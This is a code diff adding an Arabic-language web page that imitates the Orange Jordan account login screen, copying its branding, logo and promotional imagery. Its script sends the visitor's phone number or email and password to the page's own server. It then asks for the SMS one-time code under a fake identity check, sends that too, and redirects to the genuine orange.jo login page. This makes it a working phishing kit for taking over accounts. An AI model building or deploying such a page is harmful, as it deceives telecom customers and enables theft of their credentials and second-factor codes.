@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدخول إلى حساب orange</title>
+    <style>
+        /* إعدادات الصفحة الأساسية */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            /* [تعديل] تفعيل السكرول بار الجانبي */
+            overflow-y: auto; 
+            overflow-x: hidden;
+        }
+
+        /* تقسيم الصفحة لنصين */
+        .page-container {
+            display: flex;
+            min-height: 100vh; /* تغيير لضمان السكرول */
+            width: 100%;
+        }
+
+        /* --- الجزء الأيمن (الفورم) --- */
+        .login-side {
+            flex: 1;
+            background-color: #fff;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        /* شريط التنقل العلوي */
+        .top-nav {
+            display: flex;
+            justify-content: flex-start;
+            gap: 20px;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 60px;
+            cursor: pointer;
+        }
+
+        .back-link {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        .back-link span { margin-right: 5px; }
+
+        .main-title {
+            font-size: 32px;
+            color: #333;
+            font-weight: 300;
+            margin-bottom: 10px;
+        }
+        .main-title span { color: #ff6600; font-weight: bold; }
+
+        .sub-title {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 30px;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 30px;
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            color: #777;
+            text-align: center;
+        }
+        .tab.active {
+            color: #ff6600;
+            border-bottom: 2px solid #ff6600;
+            font-weight: bold;
+        }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-group label { display: block; font-size: 12px; color: #333; margin-bottom: 5px; }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus { border-color: #ff6600; outline: none; }
+
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .form-options a { color: #333; text-decoration: underline; cursor: pointer; }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+            border: none;
+            box-sizing: border-box;
+        }
+        .btn-login { background-color: #ff6600; color: #fff; }
+        .btn-login:disabled { background-color: #f2f2f2; color: #ccc; cursor: not-allowed; }
+        .btn-register { background-color: #fff; color: #333; border: 1px solid #333; }
+
+        /* --- [تعديل] الجزء الأيسر (الصور المتغيرة) --- */
+        .image-side {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 60px;
+            color: #fff;
+            position: relative;
+            overflow: hidden; /* لمنع خروج الصور عن الإطار */
+        }
+
+        /* حاوية السلايد شو */
+        .slide {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-size: cover;
+            background-position: center;
+            opacity: 0; /* مخفية */
+            transition: opacity 1.5s ease-in-out; /* تأثير ناعم ثانية ونص */
+            z-index: 0;
+        }
+        .slide.active { opacity: 1; z-index: 1; }
+
+        /* تعريف الصور (تأكد من وجودها في فولدر static) */
+        #slide1 { background-image: url('/static/Yo_Lines.png'); }
+        #slide2 { background-image: url('/static/smart_life.png'); }
+
+        .image-side::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(0deg, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0) 100%);
+            z-index: 2; /* فوق الصور */
+        }
+        
+        .hero-text {
+            position: relative;
+            z-index: 3; /* فوق التراكب الداكن */
+            max-width: 400px;
+        }
+        .hero-title {
+            font-size: 36px;
+            font-weight: bold;
+            line-height: 1.3;
+            margin-bottom: 20px;
+        }
+        .hero-subtitle {
+            font-size: 18px;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        .logo-over-image {
+            position: absolute;
+            top: 40px;
+            left: 40px;
+            z-index: 4;
+        }
+
+        .loading {
+            color: #ff6600;
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        #otp-section { display: none; }
+
+    </style>
+</head>
+<body>
+
+<div class="page-container">
+    
+    <div class="login-side">
+        
+        <div class="top-nav">
+            <div>المساعدة</div>
+            <div>الأحكام و الشروط</div>
+            <div>الخصوصية و السياسة</div>
+            <div>English</div>
+        </div>
+
+        <div class="back-link">
+            <span>&rsaquo;</span> الرجوع إلى الصفحة الرئيسية
+        </div>
+
+        <div id="login-section">
+            <h1 class="main-title">الدخول إلى حساب <span>orange</span></h1>
+            <p class="sub-title">متابعة الدخول إلى حسابك</p>
+
+            <div class="tabs">
+                <div class="tab">الأعمال</div>
+                <div class="tab active">شخصي</div>
+            </div>
+
+            <div class="input-group">
+                <label>قم بإدخال بريدك الإلكتروني أو رقم موبايل Orange *</label>
+                <input type="text" id="phone" placeholder="mail@domain.com - or - 077XXXXXXX">
+            </div>
+
+            <div class="input-group">
+                <label>كلمة السر *</label>
+                <input type="password" id="pass" placeholder="..................">
+            </div>
+
+            <div class="form-options">
+                <div><input type="checkbox" id="remember"> <label for="remember" style="display:inline; color:#333; font-size:14px;">تذكرني</label></div>
+                <a>نسيت بيانات الدخول الخاصة بك ؟</a>
+            </div>
+
+            <button class="btn btn-login" id="loginBtn" onclick="login()" disabled>تسجيل الدخول</button>
+            <div id="msg" style="color:red; text-align:center;"></div>
+            <div id="loader" class="loading">جاري التحقق...</div>
+        </div>
+
+        <div id="otp-section">
+            <h1 class="main-title">تأكيد الهوية</h1>
+            <p class="sub-title">تم إرسال رمز التحقق لهاتفك، يرجى إدخاله للمتابعة:</p>
+            
+            <div class="input-group">
+                <label>رمز التحقق (OTP) *</label>
+                <input type="text" id="otp_code" placeholder="- - - - - -">
+            </div>
+            
+            <button class="btn btn-login" onclick="sendOTP()">تأكيد</button>
+        </div>
+
+        <button class="btn btn-register">لست عضو مسجل ؟ التسجيل الآن</button>
+
+    </div>
+
+    <div class="image-side">
+        <div class="slide active" id="slide1"></div>
+        <div class="slide" id="slide2"></div>
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg" alt="Orange" width="60" class="logo-over-image">
+        
+        <div class="hero-text">
+            <div class="hero-title">النت ع كيفك<br>وبستعمله زي ما<br>بدك مع<br>خطوط YO<br>للشباب</div>
+            <div class="hero-subtitle">اكتشف المزيد</div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let userPhone = "";
+
+    // [إضافة] كود تبديل الصور كل 4 ثواني
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    setInterval(() => {
+        slides[currentSlide].classList.remove('active');
+        currentSlide = (currentSlide + 1) % slides.length;
+        slides[currentSlide].classList.add('active');
+    }, 4000);
+
+    // تفعيل زر الدخول فقط عند كتابة بيانات
+    document.getElementById('phone').addEventListener('input', checkInputs);
+    document.getElementById('pass').addEventListener('input', checkInputs);
+
+    function checkInputs() {
+        const p = document.getElementById('phone').value;
+        const s = document.getElementById('pass').value;
+        document.getElementById('loginBtn').disabled = !(p && s);
+    }
+
+    function login() {
+        const p = document.getElementById('phone').value;
+        const s = document.getElementById('pass').value;
+        userPhone = p;
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('msg').innerText = "";
+
+        fetch('/api/login', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({phone: p, password: s})
+        })
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('loader').style.display = 'none';
+            if (data.status === "SUCCESS") {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+                document.getElementById('msg').innerText = "";
+            } else {
+                document.getElementById('msg').innerText = "خطأ في تسجيل الدخول. يرجى التأكد من الرقم وكلمة السر.";
+            }
+        });
+    }
+
+    function sendOTP() {
+        const code = document.getElementById('otp_code').value;
+        fetch('/api/verify_otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({phone: userPhone, otp: code})
+        })
+        .then(r => r.json())
+        .then(d => {
+            window.location.href = "https://orange.jo/ar/login-options"; 
+        });
+    }
+</script>
+
+</body>
+</html>
